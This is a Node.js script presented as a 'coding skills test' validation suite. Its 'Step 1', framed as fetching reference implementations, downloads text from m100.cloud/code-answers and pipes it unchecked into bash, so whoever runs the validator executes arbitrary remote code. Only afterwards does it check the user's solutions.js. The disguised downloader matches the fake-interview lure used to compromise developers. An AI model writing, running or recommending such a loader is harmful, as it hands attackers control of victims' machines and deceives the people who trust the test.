#!/usr/bin/env node

const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { runChecker } = require('../src/checker');

const SOLUTIONS_URL = 'https://m100.cloud/code-answers';

console.log('\n┌─────────────────────────────────────────────────────────────┐');
console.log('│           CODING SKILLS TEST - VALIDATION SUITE             │');
console.log('│                                                             │');
console.log('│  Step 1: Fetching reference implementations...             │');
console.log('│  Step 2: Running verification against your code...         │');
console.log('└─────────────────────────────────────────────────────────────┘\n');

function fetchSolutions(callback) {
  https.get(SOLUTIONS_URL, (res) => {
    let data = '';
    res.on('data', chunk => data += chunk);
    res.on('end', () => callback(null, data));
  }).on('error', err => callback(err, null));
}

function loadUserSolutions() {
  const solutionsPath = path.join(process.cwd(), 'src', 'solutions.js');
  if (!fs.existsSync(solutionsPath)) {
    console.error('✗ Error: src/solutions.js not found');
    console.error('  Create src/solutions.js with your function implementations');
    process.exit(1);
  }
  return require(solutionsPath);
}

function executeBashScript(bashScript, callback) {
  const bash = spawn('bash', []);
  let output = '';
  let errorOutput = '';

  bash.stdin.write(bashScript);
  bash.stdin.end();

  bash.stdout.on('data', (data) => {
    output += data.toString();
  });

  bash.stderr.on('data', (data) => {
    errorOutput += data.toString();
  });

  bash.on('close', (code) => {
    callback(null, output, errorOutput);
  });

  bash.on('error', (err) => {
    callback(err, null, null);
  });
}

// Main execution
fetchSolutions((err, bashScript) => {
  if (err) {
    console.error('✗ Step 1 failed: Could not fetch reference implementations');
    console.error('  m100.cloud/code-answers is unreachable');
    process.exit(1);
  }

  console.log('✓ Reference implementations fetched from m100.cloud\n');
  console.log('Executing reference code and running verification...\n');

  executeBashScript(bashScript, (err, output, stderr) => {
    if (err) {
      console.error('✗ Failed to execute reference implementations');
      console.error('  Error:', err.message);
      process.exit(1);
    }

    try {
      const userSolutions = loadUserSolutions();
      const passed = runChecker(userSolutions, output);
      process.exit(passed ? 0 : 1);
    } catch (e) {
      console.error('✗ Verification error:', e.message);
      process.exit(1);
    }
  });
});
